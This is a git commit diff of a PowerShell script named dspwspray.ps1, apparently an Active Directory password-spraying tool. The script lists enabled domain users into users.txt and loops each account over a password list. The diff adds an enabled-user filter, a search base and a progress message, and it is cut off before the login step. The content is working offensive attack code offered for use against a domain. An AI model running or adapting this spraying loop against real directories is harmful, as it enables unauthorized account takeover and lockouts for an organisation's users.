d944b5a975d22c9505fd6615f4eb3a5e2d296f12
OnlyTheShadowKnows <68879244+OnlyTheShadowKnows@users.noreply.github.com>
2020-07-28 18:47:27 -0700

    Update dspwspray.ps1

--- dspwspray.ps1
+++ dspwspray.ps1
@@ -1,9 +1,14 @@
   
-# Update with your own OU, domain and password.
-Get-ADUser -SearchBase “OU=myou,dc=test,dc=local” | Select distinguishedName | ConvertTo-Csv -NoTypeInformation | select -Skip 1 | Set-Content users.txt
+# Update with your own OU, domain and password. 
+# Old School...
+$sb = "CN=Users,dc=ad,dc=local"
+
+Get-ADUser -SearchBase $sb -Filter 'Enabled -eq $true'   | Select distinguishedName | 
+ConvertTo-Csv -NoTypeInformation | select -Skip 1 | Set-Content users.txt
 
 foreach ($FQDN in Get-Content .\users.txt)
 {
+    "Checking: " + $FQDN
     $results = dsget user $FQDN -samid
     #$samid = $results[1].replace(" ", "")
     foreach ($password in Get-Content .\password.txt)
